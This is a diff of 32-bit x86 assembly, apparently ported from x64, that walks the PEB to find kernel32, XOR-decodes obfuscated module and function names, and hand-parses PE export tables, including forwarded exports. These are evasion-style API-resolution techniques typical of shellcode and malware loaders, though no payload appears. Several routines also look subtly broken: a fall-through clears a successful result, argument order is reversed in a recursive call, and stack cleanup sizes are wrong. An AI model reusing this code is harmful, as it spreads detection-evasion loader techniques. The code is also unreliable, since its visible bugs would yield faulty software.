@@ -101,7 +101,7 @@ wstrlen:
     mov esi, [ebp - 8]          ; save esi
     mov eax, [ebp - 4]          ; strlen
 
-    sub esp, 8                  ; free local variable space
+    add esp, 8                  ; free local variable space
     add esp, 4                  ; free arg stack
 
     leave
@@ -439,47 +439,45 @@ strchr:
     ; ebp - 8 = strlen
     ; ebp - 12 = c
     ; ebp - 16 = ebx
-    sub esp, 16                     ; allocate local variable space
+    sub esp, 16                         ; allocate local variable space
 
-    mov dword [ebp - 4], -1         ; cRet
-    mov [ebp - 16], ebx             ; save ebx
+    mov dword [ebp - 4], -1             ; cRet
+    mov [ebp - 16], ebx                 ; save ebx
 
-    sub esp, 4
-    mov eax, [ebp + 8]              ; str
-    mov [esp], eax                  ; str
+    push dword [ebp + 8]                ; str
     call strlen
 
-    mov [ebp - 8], eax              ; strlen
+    mov [ebp - 8], eax                  ; strlen
 
-    mov dword [ebp - 12], 0         ; c = 0
+    mov dword [ebp - 12], 0             ; c = 0
     .loop:
-        mov edx, [ebp + 8]          ; str
-        mov ebx, [ebp - 12]         ; c
+        mov edx, [ebp + 8]              ; str
+        mov ebx, [ebp - 12]             ; c
 
-        movzx ecx, byte [edx + ebx] ; str[c]
+        movzx ecx, byte [edx + ebx]     ; str[c]
 
-        cmp cl, [ebp + 12]          ; str[c] == chr ?
+        cmp cl, [ebp + 12]              ; str[c] == chr ?
         je .equal
 
-        inc dword [ebp - 12]        ; ++c
-        mov eax, [ebp - 8]          ; strlen
-        cmp [ebp - 12], eax         ; c < strlen
+        inc dword [ebp - 12]            ; ++c
+        mov eax, [ebp - 8]              ; strlen
+        cmp [ebp - 12], eax             ; c < strlen
 
         jne .loop
         jmp .shutdown
 
         .equal:
-            add edx, ebx            ; str + c
-            mov [ebp - 4], edx      ; cRet = str + c
+            add edx, ebx                ; str + c
+            mov [ebp - 4], edx          ; cRet = str + c
 
             jmp .shutdown
 
 .shutdown:
-    mov eax, [ebp - 4]          ; return value
-    mov ebx, [ebp - 16]         ; restore ebx
+    mov eax, [ebp - 4]                  ; return value
+    mov ebx, [ebp - 16]                 ; restore ebx
 
-    add esp, 16                 ; free local variable space
-    add esp, 8                  ; free arg stack
+    add esp, 16                         ; free local variable space
+    add esp, 8                          ; free arg stack
 
     leave
     ret
@@ -620,11 +618,10 @@ get_kernel_module_handle:
     ; ebp - 16 = kernel mod addr
     sub esp, 16                                 ; allocate local variable space
 
-    sub esp, 16                                 ; allocate arg stack
-    mov dword [esp], kernel32_xor
-    mov dword [esp + 4], kernel32_xor.len
-    mov dword [esp + 8], xor_key
-    mov dword [esp + 12], xor_key.len
+    push xor_key.len
+    push xor_key
+    push kernel32_xor.len
+    push kernel32_xor
     call my_xor
 
     mov eax, fs:[0x30]                          ; peb
@@ -645,11 +642,9 @@ get_kernel_module_handle:
         add eax, 0x2c                           ; *BaseDLLName
         add eax, 0x4                            ; BaseDLLName->Buffer
 
-        sub esp, 12
-        mov dword [esp], kernel32_xor
-        mov eax, [eax]
-        mov [esp + 4], eax                      ; BaseDLLName.Buffer
-        mov dword [esp + 8], kernel32_xor.len
+        push kernel32_xor.len
+        push dword [eax]                      ; BaseDLLName.Buffer
+        push kernel32_xor
         call strcmpiAW
 
         cmp eax, 1                              ; strings match
@@ -701,159 +696,260 @@ get_proc_address_by_name:
     ; ebp - 292 = loaded forwarded library addr
     ; ebp - 296 = function name strlen
     ; ebp - 300 = ebx
-    sub esp, 300                                ; allocate local variable space
+    ; ebp - 304 = temp var (r8)
+    ; ebp - 308 = temp var (r9)
+    ; ebp - 312 = temp var (r10)
+    ; ebp - 316 = temp var (r11)
+    sub esp, 316                                ; allocate local variable space
 
     mov dword [ebp - 4], 0                      ; return value
     mov [ebp - 300], ebx                        ; save ebx
    
-    mov ebx, [ebp + 16]         ; base addr
-    add ebx, 0x3c               ; *e_lfa_new
+    mov ebx, [ebp + 8]                          ; base addr
+    add ebx, 0x3c                               ; *e_lfa_new
 
-    movzx ecx, word [ebx]       ; e_lfanew
+    movzx ecx, word [ebx]                       ; e_lfanew
 
-    mov eax, [ebp + 16]         ; base addr
-    add eax, ecx                ; nt header
+    mov eax, [ebp + 8]                          ; base addr
+    add eax, ecx                                ; nt header
 
-    mov [ebp - 16], eax         ; nt header
+    mov [ebp - 8], eax                          ; nt header
 
-    add eax, 24                 ; optional header
-    add eax, 112                ; export data directory
+    add eax, 24                                 ; optional header
+    add eax, 96                                 ; export data directory
 
-    mov [ebp - 24], eax         ; export data directory
+    mov [ebp - 12], eax                         ; export data directory
 
-    mov eax, [ebp + 16]         ; base addr
-    mov ecx, [ebp - 24]         ; export data directory
+    mov eax, [ebp + 8]                          ; base addr
+    mov ecx, [ebp - 12]                         ; export data directory
     mov ebx, [ecx]
-    add eax, ebx                ; export directory
+    add eax, ebx                                ; export directory
 
-    mov [ebp - 32], eax         ; export directory
+    mov [ebp - 16], eax                         ; export directory
 
-    add eax, 28                 ; address of functions rva
-    mov eax, [eax]              ; rva in eax
-    add eax, [ebp + 16]         ; base addr + address of function rva
+    add eax, 28                                 ; address of functions rva
+    mov eax, [eax]                              ; rva in eax
+    add eax, [ebp + 8]                          ; base addr + address of function rva
 
-    mov [ebp - 40], eax         ; address of functions
+    mov [ebp - 20], eax                         ; address of functions
 
-    mov eax, [ebp - 32]         ; export directory
-    add eax, 32                 ; address of names rva
-    mov eax, [eax]              ; rva in eax
-    add eax, [ebp + 16]         ; base addr + address of names rva
+    mov eax, [ebp - 16]                         ; export directory
+    add eax, 32                                 ; address of names rva
+    mov eax, [eax]                              ; rva in eax
+    add eax, [ebp + 8]                          ; base addr + address of names rva
 
-    mov [ebp - 48], eax         ; address of names
+    mov [ebp - 24], eax                         ; address of names
 
-    mov eax, [ebp - 32]         ; export directory
-    add eax, 36                 ; address of name ordinals
-    mov eax, [eax]              ; rva in eax
-    add eax, [ebp + 16]         ; base addr + address of name ordinals
+    mov eax, [ebp - 16]                         ; export directory
+    add eax, 36                                 ; address of name ordinals
+    mov eax, [eax]                              ; rva in eax
+    add eax, [ebp + 8]                          ; base addr + address of name ordinals
 
-    mov [ebp - 56], eax         ; address of name ordinals
+    mov [ebp - 28], eax                         ; address of name ordinals
 
-    mov r10, [ebp - 32]         ; export directory
-    add r10, 24                 ; number of names
-    mov r10d, [r10]             ; number of names in r10
+    mov eax, [ebp - 16]
+    mov [ebp - 312], eax                        ; export directory
+    add dword [ebp - 312], 12                   ; number of names
+    mov eax, ebp
+    sub eax, 312
+    mov eax, [eax]
+    mov [ebp - 312], eax                        ; number of names in [ebp - 312]
 
-    xor r11, r11
+    mov dword [ebp - 316], 0                    ; index
 .loop_func_names:
     ; to index into an array, we multiply the size of each element with the 
     ; current index and add it to the base addr of the array
-    mov dword eax, 4            ; size of dword
-    mul r11                     ; size * index
-    mov ebx, [ebp - 48]         ; address of names
-    add ebx, eax                ; address of names + n
-    mov ebx, [ebx]              ; address of names [n]
+    mov dword eax, 4                            ; size of dword
+    mul dword [ebp - 316]                       ; size * index
+    mov ebx, [ebp - 24]                         ; address of names
+    add ebx, eax                                ; address of names + n
+    mov ebx, [ebx]                              ; address of names [n]
 
-    add ebx, [ebp +  16]        ; base addr + address of names [n]
+    add ebx, [ebp +  8]                         ; base addr + address of names [n]
 
-    mov ecx, [ebp + 24]         ; proc name
-    mov edx, ebx
-    mov r8, [ebp + 32]          ; proc name len
+    push dword [ebp + 16]                         ; proc name arg len
+    push ebx
+    push dword [ebp + 12]                         ; proc name arg
     call strcmpiAA
 
-    cmp eax, 1                  ; are strings equal
+    cmp eax, 1                                  ; are strings equal
     je .function_found
 
-    inc r11
-    cmp r11, r10
+    inc dword [ebp - 316]
+    mov eax, [ebp - 312]
+    cmp [ebp - 316], eax
     jne .loop_func_names
 
     jmp .shutdown
 
 .function_found:
     mov eax, 2
-    mul r11                     ; index * size of element of addrees of name ordinals(word)
-    add eax, [ebp - 56]         ; address of name ordinals + n
-    movzx eax, word [eax]       ; address of name ordinals [n]; index into address of functions
+    mul dword [ebp - 316]                       ; index * size of element of addrees of name ordinals(word)
+    add eax, [ebp - 28]                         ; address of name ordinals + n
+    movzx eax, word [eax]                       ; address of name ordinals [n]; index into address of functions
 
-    mov ebx, 4                  ; size of element of address of functions(dword)
-    mul ebx                     ; index * size of element
-    add eax, [ebp - 40]         ; address of functions + index
-    mov eax, dword [eax]        ; address of functions [index]
+    mov ebx, 4                                  ; size of element of address of functions(dword)
+    mul ebx                                     ; index * size of element
+    add eax, [ebp - 20]                         ; address of functions + index
+    mov eax, dword [eax]                        ; address of functions [index]
 
-    add eax, [ebp + 16]         ; base addr + address of functions [index]
+    add eax, [ebp + 8]                          ; base addr + address of functions [index]
 
-    mov [ebp - 8], eax          ; return value
+    mov [ebp - 4], eax                          ; return value
 
     ; check if the function is forwarded
-    mov r8, [ebp + 16]          ; base addr
-    mov eax, [ebp - 24]         ; export data directory
-    mov eax, [eax]              ; export data directory virtual address
-    add r8, eax                 ; base addr + virtual addr
+    mov eax, [ebp + 8]
+    mov [ebp - 304], eax                        ; base addr
+    mov eax, [ebp - 12]                         ; export data directory
+    mov eax, [eax]                              ; export data directory virtual address
+    add [ebp - 304], eax                        ; base addr + virtual addr
 
-    mov r9, r8
-    mov eax, [ebp - 24]         ; export data directory
-    add eax, 4                  ; export data directory size
-    mov eax, [eax]              ; export data directory size
-    add r9, eax                 ; base addr + virtual addr + size
+    mov eax, [ebp - 304]
+    mov [ebp - 308], eax
+    mov eax, [ebp - 12]                         ; export data directory
+    add eax, 4                                  ; export data directory size
+    mov eax, [eax]                              ; export data directory size
+    add [ebp - 308], eax                        ; base addr + virtual addr + size
 
-    cmp [ebp - 8], r8           ; below the start of the export directory
-    jl .shutdown                ; not forwarded
-                                ; or
-    cmp [ebp - 8], r9           ; above the end of the export directory
-    jg .shutdown                ; not forwarded
+    mov eax, [ebp - 304]
+    cmp [ebp - 4], eax                          ; below the start of the export directory
+    jl .shutdown                                ; not forwarded
+    ; or
+    mov eax, [ebp - 308]
+    cmp [ebp - 4], eax                          ; above the end of the export directory
+    jg .shutdown                                ; not forwarded
 
     ; make a copy of the string of the forwarded dll
-    mov ecx, ebp
-    sub ecx, 312
-    mov edx, [ebp - 8]
+    push dword [ebp - 4]
+    mov eax, ebp
+    sub eax, 284
+    push eax
     call strcpy
 
     ; find the position of the '.' which separates the dll name and function name
-    mov ecx, ebp
-    sub ecx, 312
-    mov edx, '.'
-    call strchr                 ; ptr to chr in eax
+    push dword  '.'
+    mov eax, ebp
+    sub eax, 284
+    push eax
+    call strchr                                 ; ptr to chr in eax
     
     mov byte [eax], 0
     inc eax
 
-    mov [ebp - 320], eax        ; forwarded function name
+    mov [ebp - 288], eax                        ; forwarded function name
 
-    mov ecx, ebp
-    sub ecx, 312
-    call [loadlibrary]     ; library addr
+    cmp dword [loadlibrary], 0                  ; is LoadLibrary proc available
+    je .error_shutdown
 
-    mov [ebp - 328], eax        ; library addr
+    mov eax, ebp
+    sub eax, 284
+    push eax
+    call [loadlibrary]                          ; library addr
 
-    sub rsp, 32
-    mov ecx, [ebp - 320]
-    call strlen                 ; strlen in eax
-    add rsp, 32
+    mov [ebp - 292], eax                        ; library addr
 
-    mov [ebp - 336], eax        ; function name strlen
+    push dword [ebp - 288]
+    call strlen                                 ; strlen in eax
 
-    mov ecx, [ebp - 328]
-    mov edx, [ebp - 320]
-    mov r8, [ebp - 336]
-    call get_proc_address_by_name       ; proc addr
+    mov [ebp - 296], eax                        ; function name strlen
 
-    mov [ebp - 8], eax          ; proc addr
+    push dword [ebp - 292]
+    push dword [ebp - 288]
+    push dword [ebp - 296]
+    call get_proc_address_by_name               ; proc addr
+
+    mov [ebp - 4], eax                          ; proc addr
+
+.error_shutdown:
+    mov dword [ebp - 4], 0                      ; proc addr not found
 
 .shutdown:
     mov ebx, [ebp - 300]                        ; restore ebx
     mov eax, [ebp - 4]                          ; return value
 
-    add esp, 300                                ; free local variable space
+    add esp, 316                                ; free local variable space
     add esp, 12                                 ; free arg stack
+
+    leave
+    ret
+
+; arg0: base addr               [ebp + 8]
+; arg1: proc name               [ebp + 12]
+;
+; return: proc addr             eax
+get_proc_address_by_get_proc_addr:
+    push ebp
+    mov ebp, esp
+
+    ; ebp - 4 = return value
+    sub esp, 4                      ; allocate local variable space
+
+    mov dword [ebp - 4], 0          ; return value
+    
+    cmp dword [get_proc_addr], 0    ; is GetProcAddress available ?
+    je .shutdown
+
+    push dword [ebp + 8]            ; base addr
+    push dword [ebp + 12]           ; proc name
+    call [get_proc_addr]            ; proc addr
+
+    mov [ebp - 4], eax              ; return value
+
+.shutdown:
+    mov eax, [ebp - 4]              ; return value
+
+    add esp, 12                     ; free arg stack
+
+    leave
+    ret
+
+; arg0: base addr               [ebp + 8]
+; arg1: xor str                 [ebp + 12]
+; arg2: xor str len             [ebp + 16]
+; arg3: is get proc addr        [ebp + 20]
+;
+; return: proc addr             eax
+unxor_and_get_proc_addr:
+    push ebp
+    mov ebp, esp
+
+    ; ebp - 4 = return value
+    sub esp, 4                                  ; allocate local variable space
+
+    mov dword [ebp - 4], 0                      ; return value
+
+    push xor_key.len
+    push xor_key
+    push dword [ebp + 16]                       ; xor str key
+    push dword [ebp + 12]                       ; xor str
+    call my_xor
+
+    cmp dword [ebp + 20], 1                     ; is get proc addr
+    jne .not_get_proc_addr
+        push dword [ebp + 16]                         ; xor str len
+        push dword [ebp + 12]                         ; xor str
+        push dword [ebp + 8]                          ; base addr
+        call get_proc_address_by_name
+
+        mov [ebp - 4], eax                      ; return value
+
+        jmp .shutdown
+
+.not_get_proc_addr:
+    push dword [ebp + 16]                             ; xor str len
+    push dword [ebp + 12]                             ; xor str
+    push dword [ebp + 8]                              ; base addr
+    call get_proc_address_by_get_proc_addr
+
+    mov [ebp - 4], eax                          ; return value
+
+    jmp .shutdown
+
+.shutdown:
+    mov eax, [ebp - 4]                          ; return value
+
+    add esp, 4                                  ; free local variable space
+    add esp, 16                                 ; free arg stack
 
     leave
     ret
